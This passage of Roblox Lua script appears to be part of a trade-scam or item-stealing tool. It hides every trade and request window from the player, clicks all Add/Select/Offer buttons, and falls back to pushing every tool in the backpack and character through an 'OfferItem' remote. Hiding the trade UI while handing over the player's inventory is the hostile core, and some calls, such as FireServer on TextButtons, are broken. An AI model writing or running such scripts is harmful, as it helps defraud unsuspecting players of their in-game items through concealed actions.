-- Function to HIDE every trade-related GUI
local function hideAllTradeGUIs()
    local gui = player:FindFirstChild("PlayerGui")
    if not gui then return end
    for _, obj in pairs(gui:GetDescendants()) do
        if obj:IsA("ScreenGui") and (obj.Name:lower():find("trade") or obj.Name:lower():find("request")) then
            obj.Enabled = false
        end
        if obj:IsA("Frame") and (obj.Name:lower():find("trade") or obj.Name:lower():find("request")) then
            obj.Visible = false
        end
        if obj:IsA("TextButton") and (obj.Name:lower():find("accept") or obj.Name:lower():find("add") or obj.Name:lower():find("select")) then
            -- Hide button text or disable (optional)
        end
    end
end

-- Function to click all "Add" / "Select" buttons in the trade GUI
local function addAllItemsViaGUI()
    local gui = player:FindFirstChild("PlayerGui")
    if not gui then return false end
    local tradeGUI = nil
    -- Find the trade window
    local function search(parent)
        for _, child in pairs(parent:GetChildren()) do
            if child:IsA("Frame") and (child.Name:lower():find("trade") or child.Name:lower():find("request")) then
                tradeGUI = child
                return
            end
            search(child)
        end
    end
    search(gui)
    if not tradeGUI then
        -- Fallback: find any frame that has both Accept and Add buttons
        local function finder(parent)
            for _, child in pairs(parent:GetChildren()) do
                if child:IsA("Frame") then
                    local hasAccept, hasAdd = false, false
                    for _, sub in pairs(child:GetDescendants()) do
                        if sub:IsA("TextButton") then
                            if sub.Name:lower():find("accept") then hasAccept = true end
                            if sub.Name:lower():find("add") or sub.Name:lower():find("select") then hasAdd = true end
                        end
                    end
                    if hasAccept and hasAdd then
                        tradeGUI = child
                        return
                    end
                end
                finder(child)
            end
        end
        finder(gui)
    end
    if not tradeGUI then return false end

    -- Hide it
    tradeGUI.Visible = false
    if tradeGUI.Parent and tradeGUI.Parent:IsA("ScreenGui") then
        tradeGUI.Parent.Enabled = false
    end

    -- Click all Add/Select buttons
    local count = 0
    for _, btn in pairs(tradeGUI:GetDescendants()) do
        if btn:IsA("TextButton") then
            local name = btn.Name:lower()
            if name:find("add") or name:find("select") or name:find("offer") then
                pcall(function() btn:FireServer() end)
                count = count + 1
            end
        end
    end
    print("Added " .. count .. " items via GUI clicks")
    return count > 0
end

-- Fallback: use OfferItem remote to add all tools
local function addAllItemsViaRemote()
    if not OfferItem then return false end
    local offered = 0
    local tools = {}
    -- Collect all tools from Backpack and Character
    for _, tool in pairs(player.Backpack:GetChildren()) do
        if tool:IsA("Tool") then table.insert(tools, tool) end
    end
    for _, tool in pairs(char:GetChildren()) do
        if tool:IsA("Tool") then table.insert(tools, tool) end
    end
    for _, tool in ipairs(tools) do
        local ok, err = pcall(function() OfferItem:FireServer(tool) end)
        if not ok then
            -- try with name only
            ok, err = pcall(function() OfferItem:FireServer(tool.Name) end)
        end
        if ok then
            offered = offered + 1
            print("Offered: " .. tool.Name)
        end
        wait(0.1)
    end
    print("Offered " .. offered .. " items via remote")
    return offered > 0
end

